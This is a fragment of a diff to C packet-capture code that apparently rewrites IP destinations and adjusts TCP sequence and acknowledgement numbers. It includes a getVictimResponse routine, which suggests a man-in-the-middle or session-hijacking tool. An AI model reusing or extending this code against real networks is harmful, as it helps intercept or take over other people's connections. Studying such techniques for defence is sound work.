@@ -248,8 +248,6 @@ void packetHandler(u_char *userData, const struct pcap_pkthdr *packet_header, co
 			printf("\t\tip dst = %s\n", ip_destination);
 			printf("\t\trep dst = %s\n", ip_new_destination);
 
-			ip_checksum((void *)ipHeader, ntohs(ipHeader->ip_len));
-
 			if ((ipHeader->ip_p) == IP_PROTO_TCP)
 			{
 				printf("\t\tTCP\n");
@@ -261,8 +259,6 @@ void packetHandler(u_char *userData, const struct pcap_pkthdr *packet_header, co
 				if (receivedResponse == 1 && bsend == 1)
 				{
 					/*
-					if (tcp_pack_p->th_flags == TH_SYN || tcp_pack_p->th_flags == TH_ACK){
-					}
 
 					else if Flag & THF_FIN == TH_FIN
 
@@ -271,9 +267,16 @@ void packetHandler(u_char *userData, const struct pcap_pkthdr *packet_header, co
 					Ack = payload
 					*/
 					printf("\t\t\treceived response entered\n");
-					temp = (htonl(response_seq) + 1);
-					response_seq = ntohl(temp);
-					memcpy(&tcpHeader->th_ack, &response_seq, sizeof(tcpHeader->th_ack));
+					if (tcp_pack_p->th_flags == TH_SYN || tcp_pack_p->th_flags == TH_ACK)
+					{
+						temp = (htonl(response_seq) + 1);
+						response_seq = ntohl(temp);
+						memcpy(&tcpHeader->th_ack, &response_seq, sizeof(tcpHeader->th_ack));
+					}
+					else if (tcp_pack_p->th_flags == TH_PUSH)
+					{
+						memcpy(&tcpHeader->th_ack, &response_seq, sizeof(tcpHeader->th_ack));
+					}
 					printf("\t\t\tmod seq = %u\n", htonl(tcpHeader->th_seq));
 					printf("\t\t\tmod ack = %u\n", htonl(tcpHeader->th_ack));
 				}
@@ -407,6 +410,7 @@ void packetHandler(u_char *userData, const struct pcap_pkthdr *packet_header, co
 			}
 		}
 	}
+	ip_checksum((void *)ipHeader, ntohs(ipHeader->ip_len));
 	if (bsend == 1)
 	{
 		receivedResponse = 0;
@@ -662,7 +666,7 @@ void getVictimResponse()
 	response_seq = responseTCPHeader->th_seq;
 
 	printf("\t\t\tgot response seq = %u\n", htonl(responseTCPHeader->th_seq));
-	printf("\t\t\tgot response ack = %u\n", htonl(response_ack));
+	printf("\t\t\tgot response ack = %u\n\n\n", htonl(response_ack));
 
 	receivedResponse = 1;
 }
